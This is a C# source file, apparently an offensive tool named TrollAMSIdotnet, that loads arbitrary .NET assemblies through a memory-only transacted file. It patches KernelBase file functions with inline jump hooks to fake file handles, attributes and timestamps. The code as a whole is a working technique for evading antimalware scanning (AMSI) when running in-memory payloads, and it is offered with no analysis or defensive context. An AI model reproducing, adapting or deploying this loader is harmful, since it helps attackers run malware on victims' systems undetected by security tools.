using System;
using System.Reflection;
using System.Runtime.InteropServices;
using System.Text;


public static class TrollAMSIdotnet 
{

    [DllImport("Kernel32.dll")][return: MarshalAs(UnmanagedType.Bool)]
    public static extern bool WriteFile(IntPtr hFile,byte[] lpBuffer,uint nNumberOfBytesToWrite,out uint lpNumberOfBytesWritten,IntPtr lpOverlapped);

    [System.Runtime.InteropServices.DllImport("ktmw32.dll", SetLastError = true, CallingConvention = System.Runtime.InteropServices.CallingConvention.StdCall)]
    public extern static System.IntPtr CreateTransaction(IntPtr lpTransactionAttributes,IntPtr UOW,int CreateOptions,int IsolationLevel,int IsolationFlags,int Timeout,[System.Runtime.InteropServices.MarshalAs(System.Runtime.InteropServices.UnmanagedType.LPWStr)] System.Text.StringBuilder Description);

    [DllImport("Kernel32.dll", SetLastError = true)]
    public static extern IntPtr CreateFileTransactedW([MarshalAs(UnmanagedType.LPWStr)] string lpFileName,UInt32 dwDesiredAccess,UInt32 dwShareMode,IntPtr lpSecurityAttributes,UInt32 dwCreationDisposition,UInt32 dwFlagsAndAttributes,IntPtr hTemplateFile,IntPtr hTransaction,ref ushort pusMiniVersion,IntPtr nullValue);

    [DllImport("Kernel32.dll", SetLastError = true)]
    [return: MarshalAs(UnmanagedType.Bool)]
    public static extern bool CloseHandle(IntPtr hObject);

    [DllImport("KernelBase.dll")]
    public static extern IntPtr CreateFileW([MarshalAs(UnmanagedType.LPWStr)] string lpFileName,UInt32 dwDesiredAccess,UInt32 dwShareMode,IntPtr lpSecurityAttributes,UInt32 dwCreationDisposition,UInt32 dwFlagsAndAttributes,IntPtr hTemplateFile);

    [UnmanagedFunctionPointer(CallingConvention.StdCall)]
    public delegate IntPtr delegateCreateFileW([MarshalAs(UnmanagedType.LPWStr)] string lpFileName,UInt32 dwDesiredAccess,UInt32 dwShareMode,IntPtr lpSecurityAttributes,UInt32 dwCreationDisposition,UInt32 dwFlagsAndAttributes,IntPtr hTemplateFile);

    [DllImport("KernelBase.dll")]
    public static extern uint GetFileAttributesW(IntPtr lpFileName);

    [UnmanagedFunctionPointer(CallingConvention.StdCall)]
    public delegate uint delegateGetFileAttributesW(IntPtr lpFileName);


    [DllImport("KernelBase.dll")]
    public static extern bool GetFileAttributesExW(IntPtr lpFileName,uint fInfoLevelId,IntPtr lpFileInformation);

    [UnmanagedFunctionPointer(CallingConvention.StdCall)]
    public delegate bool delegateGetFileAttributesExW(IntPtr lpFileName,uint fInfoLevelId,IntPtr lpFileInformation);

    [DllImport("KernelBase.dll", SetLastError = true)]
    public static extern bool GetFileInformationByHandle(IntPtr hFile, IntPtr lpFileInformation);

    [UnmanagedFunctionPointer(CallingConvention.StdCall)]
    public delegate bool deledateGetFileInformationByHandle(IntPtr hFile,IntPtr lpFileInformation);


    public static IntPtr createFileHandle;
    public static string loadedAssemblyName;
    public static byte[] assemblyBytes;
    public static byte[] attributeData = new byte[36];
    static bool attribDataSet = false;
    static int assemblyLength;
    static NetHook hook1= new NetHook(), hook2= new NetHook(), hook3 = new NetHook(), hook4 = new NetHook();

    
    public static Assembly Load(byte[] assemblyBytes, string assemblyName)
    {
        Assembly a = Load2(assemblyBytes, assemblyName);
        return a;
    }

    public static void Invoke(Assembly a, string[] args)
    {
        a.EntryPoint.Invoke(null, new object[] { args });
    }



    public static Assembly Load2(byte[] assemblyBytes, string assemblyName)
    {

        loadedAssemblyName = assemblyName;

        IntPtr UOW = IntPtr.Zero;
        IntPtr lpTransactionAttributes = IntPtr.Zero;
        int CreateOptions = 0;
        int IsolationLevel = 0;
        int IsolationFlags = 0;
        int Timeout = 0;
        Random rand = new Random();
        StringBuilder Description = new StringBuilder(getRandomName(rand));
        ushort miniVersion = 0xffff;
        IntPtr transactionHandle = IntPtr.Zero;
        //Create a transaction, pass the transaction handle to CreateFileTransacted
     
        transactionHandle = CreateTransaction(lpTransactionAttributes, UOW, CreateOptions, IsolationLevel, IsolationFlags, Timeout, Description);
        string path = Environment.GetFolderPath(Environment.SpecialFolder.Desktop);
        path = path + string.Format(@"\{0}.log", getRandomName(rand));
        createFileHandle = CreateFileTransactedW(path, 0x80000000 | 0x40000000, 0x00000002, IntPtr.Zero, 0x00000001, 0x100 | 0x04000000, IntPtr.Zero, transactionHandle, ref miniVersion, IntPtr.Zero);
        if (createFileHandle.ToInt32() == -1){throw new ArgumentException("Error - Invalid handle returned by CreateFileTransacted call");}
        uint bytesWritten = 0;
        assemblyLength = assemblyBytes.Length;
        bool written = WriteFile(createFileHandle, assemblyBytes, (uint)assemblyBytes.Length, out bytesWritten, IntPtr.Zero);


        delegateCreateFileW A = CreateFileWDetour;
        delegateGetFileAttributesW B = GetFileAttributesWDetour;
        delegateGetFileAttributesExW C = GetFileAttributesExWDetour;
        deledateGetFileInformationByHandle D = GetFileInformationByHandleDetour;

        hook1.Install(hook1.GetProcAddress("KernelBase.dll", "CreateFileW"), Marshal.GetFunctionPointerForDelegate(A));
        hook2.Install(hook2.GetProcAddress("KernelBase.dll", "GetFileAttributesW"), Marshal.GetFunctionPointerForDelegate(B));
        hook3.Install(hook3.GetProcAddress("KernelBase.dll", "GetFileAttributesExW"), Marshal.GetFunctionPointerForDelegate(C));
        hook4.Install(hook4.GetProcAddress("KernelBase.dll", "GetFileInformationByHandle"), Marshal.GetFunctionPointerForDelegate(D));
     
        Assembly a = Assembly.Load(loadedAssemblyName.Substring(0, loadedAssemblyName.Length - 4));

        attribDataSet = false;
        CloseHandle(createFileHandle);
        CloseHandle(transactionHandle);

        return a;

    }


    static private string getRandomName(Random rand)
    {
        string seedVals = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz";
        char[] stringChars = new char[8];
        for (int i = 0; i < stringChars.Length; i++)
        {
            stringChars[i] = seedVals[rand.Next(seedVals.Length)];
        }
        return new string(stringChars);
    }

    static private IntPtr CreateFileWDetour([MarshalAs(UnmanagedType.LPWStr)] string lpFileName, UInt32 dwDesiredAccess, UInt32 dwShareMode, IntPtr lpSecurityAttributes, UInt32 dwCreationDisposition, UInt32 dwFlagsAndAttributes, IntPtr hTemplateFile)
    {
        try
        {
            hook1.Suspend();

            if (lpFileName.EndsWith(loadedAssemblyName, StringComparison.OrdinalIgnoreCase))
            {

                //if a request is made for the nonexistent assembly we're attempting to load, we return a handle to our memory-only transacted file
                return createFileHandle;
            }
            IntPtr fileHandle = CreateFileW(lpFileName, dwDesiredAccess, dwShareMode, lpSecurityAttributes, dwCreationDisposition, dwFlagsAndAttributes, hTemplateFile);
            return fileHandle;
        }
        finally
        {
            hook1.Resume();
        }
    }

    static private uint GetFileAttributesWDetour(IntPtr lpFileName)
    {
        try
        {
            hook2.Suspend();

            string fileName = Marshal.PtrToStringUni(lpFileName);
            if (fileName.EndsWith(loadedAssemblyName, StringComparison.OrdinalIgnoreCase))
            {
                //32 == FILE_ATTRIBUTE_ARCHIVE  -- default value returned when Assembly.Load() is ran with an on-disk assembly
                return 32;
            }
            else
            {
                return GetFileAttributesW(lpFileName);
            }

        }
        finally
        {
            hook2.Resume();
        }
    }

    static private bool GetFileAttributesExWDetour(IntPtr lpFileName, uint fInfoLevelId, IntPtr lpFileInformation)
    {
        try
        {
            hook3.Suspend();

            string fileName = Marshal.PtrToStringUni(lpFileName);
            if (fileName.EndsWith(loadedAssemblyName, StringComparison.OrdinalIgnoreCase))
            {
                //builds a byte array that represents a WIN32_FILE_ATTRIBUTE_DATA structure.  Will only build it once as this call is made twice in an Assembly.Load() call
                if (!attribDataSet)
                {
                    Random a = new Random();
                    DateTime creationTime = DateTime.Now.AddSeconds(a.Next(604800) * -1);
                    BitConverter.GetBytes(0x00000020).CopyTo(attributeData, 0);
                    BitConverter.GetBytes(creationTime.ToFileTime()).CopyTo(attributeData, 4);
                    TimeSpan t = DateTime.Now - creationTime;
                    DateTime writeTime = creationTime.AddSeconds(a.Next((int)t.TotalSeconds));
                    BitConverter.GetBytes(writeTime.ToFileTime()).CopyTo(attributeData, 20);
                    t = DateTime.Now - writeTime;
                    DateTime modifiedTime = writeTime.AddSeconds(a.Next((int)t.TotalSeconds));
                    BitConverter.GetBytes(modifiedTime.ToFileTime()).CopyTo(attributeData, 12);
                    BitConverter.GetBytes(0x00000000).CopyTo(attributeData, 28);
                    BitConverter.GetBytes(assemblyLength).CopyTo(attributeData, 32);
                    Marshal.Copy(attributeData, 0, lpFileInformation, 36);
                    attribDataSet = true;
                    return true;
                }
                else
                {
                    Marshal.Copy(attributeData, 0, lpFileInformation, 36);
                    return true;
                }
            }
            return GetFileAttributesExW(lpFileName, fInfoLevelId, lpFileInformation);

        }
        finally
        {
            hook3.Resume();
        }
    }

    static private bool GetFileInformationByHandleDetour(IntPtr hFile, IntPtr lpFileInformation)
    {
        try
        {
            hook4.Suspend();

            if (hFile == createFileHandle)
            {

                //builds a byte array that represents a BY_HANDLE_FILE_INFORMATION struct and writes it to the lpFileInformation pointer
                //contains the same information first provided in the GetFileAttributesExW call as the CLR compares these to ensure it has a handle to the correct file
                byte[] handleFileInfoData = new byte[52];
                Buffer.BlockCopy(attributeData, 0, handleFileInfoData, 0, 28);
                Random byteGenerator = new Random();
                byte[] serialNumber = new byte[4];
                byte[] fileFingerprint = new byte[8];
                byteGenerator.NextBytes(serialNumber);
                byteGenerator.NextBytes(fileFingerprint);
                //probably unecessary to swap these back to 0
                fileFingerprint[0] = 0x00;
                fileFingerprint[1] = 0x00;
                Array.Copy(serialNumber, 0, handleFileInfoData, 28, 4);
                Buffer.BlockCopy(attributeData, 28, handleFileInfoData, 32, 8);
                BitConverter.GetBytes(0x01).CopyTo(handleFileInfoData, 40);
                Array.Copy(fileFingerprint, 0, handleFileInfoData, 44, 8);
                Marshal.Copy(handleFileInfoData, 0, lpFileInformation, 52);
                return true;
            }
            return GetFileInformationByHandle(hFile, lpFileInformation);

        }
        finally
        {
            hook4.Resume();
        }
    }


}


public class NetHook
{
    private int mOldMemoryProtect;
    private IntPtr mOldMethodAddress;
    private IntPtr mNewMethodAddress;
    private byte[] mOldMethodAsmCode;
    private byte[] mNewMethodAsmCode;

    public const int PAGE_EXECUTE_READWRITE = 64;
    public static readonly IntPtr NULL = IntPtr.Zero;

    [DllImport("kernel32.dll", CharSet = CharSet.Auto)]
    public static extern IntPtr GetModuleHandle(string lpModuleName);

    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern IntPtr GetProcAddress(IntPtr hModule, string lpProcName);

    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern bool VirtualProtect(IntPtr lpAddress, int dwSize, int flNewProtect, out int lpflOldProtect);

    public void Install(IntPtr oldMethodAddress, IntPtr newMethodAddress)
    {
        if (oldMethodAddress == NULL || newMethodAddress == NULL)
            throw new Exception("The address is invalid.");
        if (!VirtualProtect(oldMethodAddress,12, PAGE_EXECUTE_READWRITE, out this.mOldMemoryProtect))
            throw new Exception("Unable to modify memory protection.");
        this.mOldMethodAddress = oldMethodAddress;
        this.mNewMethodAddress = newMethodAddress;
        this.mOldMethodAsmCode = this.GetHeadCode(this.mOldMethodAddress);
        this.mNewMethodAsmCode = this.ConvetToBinary((long)this.mNewMethodAddress);
        this.mNewMethodAsmCode = this.CombineOfArray(new byte[] { 0x48, 0xB8 }, this.mNewMethodAsmCode);
        this.mNewMethodAsmCode = this.CombineOfArray(this.mNewMethodAsmCode, new byte[] { 0xFF, 0xE0 });
        if (!this.WriteToMemory(this.mNewMethodAsmCode, this.mOldMethodAddress, 12))
            throw new Exception("Cannot be written to memory.");
    }

    public void Suspend()
    {
        if (this.mOldMethodAddress == NULL)
            throw new Exception("Unable to suspend.");
        this.WriteToMemory(this.mOldMethodAsmCode, this.mOldMethodAddress, 12);
    }

    public void Resume()
    {
        if (this.mOldMethodAddress == NULL)
            throw new Exception("Unable to resume.");
        this.WriteToMemory(this.mNewMethodAsmCode, this.mOldMethodAddress, 12);
    }

    private byte[] GetHeadCode(IntPtr ptr)
    {
        byte[] buffer = new byte[12];
        Marshal.Copy(ptr, buffer, 0, 12);
        return buffer;
    }
    private byte[] ConvetToBinary(long num)
    {
        byte[] buffer = new byte[8];
        IntPtr ptr = Marshal.AllocHGlobal(8);
        Marshal.WriteInt64(ptr, num);
        Marshal.Copy(ptr, buffer, 0, 8);
        Marshal.FreeHGlobal(ptr);
        return buffer;
    }
    private byte[] CombineOfArray(byte[] x, byte[] y)
    {
        int i = 0, len = x.Length;
        byte[] buffer = new byte[len + y.Length];
        while (i < len)
        {
            buffer[i] = x[i];
            i++;
        }
        while (i < buffer.Length)
        {
            buffer[i] = y[i - len];
            i++;
        }
        return buffer;
    }
    private bool WriteToMemory(byte[] buffer, IntPtr address, uint size)
    {
        try { Marshal.Copy(buffer, 0, address, 12); return true; } catch (Exception e) { return false; }   

    }

    public IntPtr GetProcAddress(string strLibraryName, string strMethodName)
    {
        return GetProcAddress(GetModuleHandle(strLibraryName), strMethodName);
    }

}





